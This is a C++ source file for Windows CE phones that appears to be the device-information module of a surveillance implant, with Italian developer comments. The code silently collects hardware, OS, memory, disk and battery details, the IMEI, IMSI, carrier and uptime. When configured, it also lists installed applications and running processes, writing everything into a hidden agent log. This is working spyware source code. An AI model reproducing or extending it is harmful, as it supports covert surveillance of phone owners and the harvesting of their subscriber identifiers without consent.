#include "Common.h"
#include "Module.h"
#include "Log.h"
#include "Device.h"

#include <tapi.h>
#include <extapi.h>
#include <regext.h>
#include <snapi.h>
#include <pm.h>

DWORD WINAPI DeviceInfoAgent(LPVOID lpParam) {
	Log log;
	Device *deviceObj = Device::self();
	WCHAR wLine[MAX_PATH + 1];
	ULARGE_INTEGER lFreeToCaller, lDiskSpace, lDiskFree;
	OSVERSIONINFO os;
	SYSTEM_INFO si;
	MEMORYSTATUS ms;
	UINT uDisks, i;
	Configuration *conf;
	BOOL bList;

	Module *me = (Module *)lpParam;
	HANDLE eventHandle;

	conf = me->getConf();

	try {
		bList = conf->getBool(L"list");
	} catch (...) {
		bList = FALSE;
	}

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - DeviceInfo.cpp - Device  Module started\n", 5, FALSE);

	deviceObj->RefreshData();

	if (log.CreateLog(LOGTYPE_DEVICE, NULL, 0, FLASH) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	// XXX allocare spazio come si deve se decidiamo di tenere questo agente
	ZeroMemory(wLine, sizeof(wLine));
	ZeroMemory(&si, sizeof(si));

	deviceObj->GetSystemInfo(&si);

	wsprintf(wLine, L"Processor: %d x ", si.dwNumberOfProcessors);
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	switch (si.wProcessorArchitecture) {
		case PROCESSOR_ARCHITECTURE_INTEL:
			wsprintf(wLine, L"Intel ");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			switch(si.wProcessorLevel) {
				case 4:
					wsprintf(wLine, L"80486");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				case 5:
					wsprintf(wLine, L"Pentium");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				default:
					break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_MIPS:
			wsprintf(wLine, L"Mips ");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			switch(si.wProcessorLevel) {
		case 3:
			wsprintf(wLine, L"R3000");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;

		case 4:
			wsprintf(wLine, L"R4000");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;

		case 5:
			wsprintf(wLine, L"R5000");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;

		default:
			break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_SHX:
			switch(si.wProcessorLevel) {
		case 3:
			wsprintf(wLine, L"Sh3");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;

		case 4:
			wsprintf(wLine, L"Sh4");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;

		default:
			wsprintf(wLine, L"Shx");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_ARM:
			wsprintf(wLine, L"Arm ");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			switch(si.wProcessorLevel) {
		case 4:
			wsprintf(wLine, L"4");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;

		default:
			break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_UNKNOWN:
		default: 
			wsprintf(wLine, L"Unknown");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;
	}

	wsprintf(wLine, L" (page %d bytes)\n", si.dwPageSize);
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	// Info sulla batteria
	const SYSTEM_POWER_STATUS_EX2 *pBattery = deviceObj->GetBatteryStatus();

	if (pBattery) {
		wsprintf(wLine, L"Battery: %d%%", pBattery->BatteryLifePercent);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));

		if (pBattery->ACLineStatus == AC_LINE_ONLINE) {
			wsprintf(wLine, L" (on AC line)", pBattery->ACLineStatus);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
		}

		wsprintf(wLine, L"\n");
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
	}

	// Info sulla RAM
	ZeroMemory(&ms, sizeof(ms));
	deviceObj->GetMemoryInfo(&ms);

	if (ms.dwTotalPhys && ms.dwAvailPhys) {
		wsprintf(wLine, L"Memory: %dMB free / %dMB total (%d%% used)\n", ms.dwAvailPhys / 1000000, ms.dwTotalPhys / 1000000, ms.dwMemoryLoad);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
	}

	// Prendiamo le informazioni sui dischi
	uDisks = deviceObj->GetDiskNumber();
	wstring strDiskName;

	for (i = 0; i < uDisks; i++) {
		if (deviceObj->GetDiskInfo(i, strDiskName, &lFreeToCaller, &lDiskSpace, &lDiskFree)) {
			if (strDiskName.size()) {
				wsprintf(wLine, L"Disk: \"%s\"", strDiskName.c_str());
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			}

			if (lDiskSpace.QuadPart && lDiskFree.QuadPart) {
				UINT uFree, uTotal;
				uFree = (UINT)(lDiskFree.QuadPart / 1000000);
				uTotal = (UINT)(lDiskSpace.QuadPart / 1000000);
				wsprintf(wLine, L" - %uMB free / %uMB total\n", uFree, uTotal);
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			} else {
				wsprintf(wLine, L"\n");
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			}
		}	
	}

	wsprintf(wLine, L"\n");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	ZeroMemory(&os, sizeof(os));

	if (deviceObj->GetOsVersion(&os)) {
		wsprintf(wLine, L"OS Version: Windows CE %d.%d (build %d) Platform ID %d", os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber, os.dwPlatformId);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));

		if (os.szCSDVersion && wcslen(os.szCSDVersion)) {
			wsprintf(wLine, L" (\"%s\")\n", os.szCSDVersion);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
		} else {
			wsprintf(wLine, L"\n");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
		}
	}

	wsprintf(wLine, L"\n");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	wsprintf(wLine, L"Device: %s (%s)\n", deviceObj->GetModel().size() ? deviceObj->GetModel().c_str() : L"Unknown",
		deviceObj->GetManufacturer().size() ? deviceObj->GetManufacturer().c_str() : L"Unknown");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	wsprintf(wLine, L"IMEI: %s\n", deviceObj->GetImei().size() ? deviceObj->GetImei().c_str() : L"Unknown");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	wsprintf(wLine, L"IMSI: %s\n", deviceObj->GetImsi().size() ? deviceObj->GetImsi().c_str() : L"Unknown");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	// Leggiamo l'operatore
	WCHAR wCarrier[50];

	if (RegistryGetString(SN_PHONEOPERATORNAME_ROOT, SN_PHONEOPERATORNAME_PATH, SN_PHONEOPERATORNAME_VALUE,
		wCarrier, sizeof(wCarrier)) == S_OK && wcslen(wCarrier)) {

			wsprintf(wLine, L"Carrier: %s\n", wCarrier);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
	}

	DWORD dwUptime = GetTickCount();
	DWORD dwDays, dwHours, dwMinutes;

	dwDays = dwUptime / (24 * 60 * 60 * 1000);
	dwUptime %= (24 * 60 * 60 * 1000);

	dwHours = dwUptime / (60 * 60 * 1000);
	dwUptime %= (60 * 60 * 1000);

	dwMinutes = dwUptime / (60 * 1000);
	dwUptime %= (60 * 1000);

	wsprintf(wLine, L"Uptime: %d days %d hours %d minutes\n\n", dwDays, dwHours, dwMinutes);
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	if (bList) {
		// Leggiamo la lista dei programmi installati
		do {
			HKEY hApps;
			LONG lRet;
			UINT i;
			WCHAR wKeyName[256] = {0};
			DWORD dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);

			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Apps", 0, 0, &hApps) != ERROR_SUCCESS)
				break;

			wsprintf(wLine, L"Application List:\n");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			for (i = 0; ; i++) {
				lRet = RegEnumKeyEx(hApps, i, wKeyName, &dwKeySize, NULL, NULL, NULL, NULL);

				if (lRet == ERROR_MORE_DATA) {
					continue;
				}

				if (lRet != ERROR_SUCCESS) {
					RegCloseKey(hApps);
					break;
				}

				wsprintf(wLine, L"%s\n", wKeyName);
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
				dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);
			}
		} while(0);

		// Prendiamo la lista dei processi
		do {
			wsprintf(wLine, L"\nProcess List\n", dwDays, dwHours, dwMinutes);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			// Il secondo flag e' un undocumented che serve a NON richiedere la lista
			// degli heaps altrimenti la funzione fallisce sempre per mancanza di RAM.
			PROCESSENTRY32 pe;
			HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);

			if (hSnap == INVALID_HANDLE_VALUE)
				break;

			pe.dwSize = sizeof(PROCESSENTRY32);

			if (Process32First(hSnap, &pe)) {
				do {
					wsprintf(wLine, L"PID: 0x%08x - ", pe.th32ProcessID);
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));

					wsprintf(wLine, L"%s", pe.szExeFile);
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));

					wsprintf(wLine, L"\n");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
				} while (Process32Next(hSnap, &pe));
			}

			CloseToolhelp32Snapshot(hSnap);
		} while(0);
	}

	WCHAR wNull = 0;
	log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));
	log.CloseLog();

	me->setStatus(MODULE_STOPPED);
	return 0;
}